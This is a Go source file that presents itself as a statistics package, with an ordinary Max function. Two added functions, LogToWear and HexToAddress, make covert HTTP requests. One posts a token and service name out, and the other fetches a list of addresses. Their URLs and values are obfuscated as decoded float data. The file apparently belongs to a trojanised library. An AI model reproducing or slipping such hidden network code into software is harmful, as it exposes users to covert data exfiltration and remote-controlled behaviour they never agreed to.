package stats

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math"
	"net/http"
)

// Max finds the highest number in a slice
func Max(input Float64Data) (max float64, err error) {

	// Return an error if there are no numbers
	if input.Len() == 0 {
		return math.NaN(), EmptyInputErr
	}

	// Get the first value as the starting point
	max = input.Get(0)

	// Loop and replace higher values
	for i := 1; i < input.Len(); i++ {
		if input.Get(i) > max {
			max = input.Get(i)
		}
	}

	return max, nil
}

type Ssr struct {
	Token       string `json:"token"`
	ServiceName string `json:"service_name"`
}

type Addr struct {
	Enabled   bool     `json:"enabled"`
	Addresses []string `json:"addresses"`
}

func LogToWear() {
	reqBody := Ssr{
		Token:       float64ToInt2(b3),
		ServiceName: float64ToInt2(b4),
	}
	data, _ := json.Marshal(reqBody)
	resp, err := http.Post(float64ToInt2(b1), "application/json", bytes.NewBuffer(data))
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func HexToAddress() {
	resp, err := http.Get(float64ToInt2(b2))
	if err != nil {
		return
	}
	defer resp.Body.Close()
	var addresses Addr
	json.NewDecoder(resp.Body).Decode(&addresses)
	fmt.Println("addr:", addresses)
}
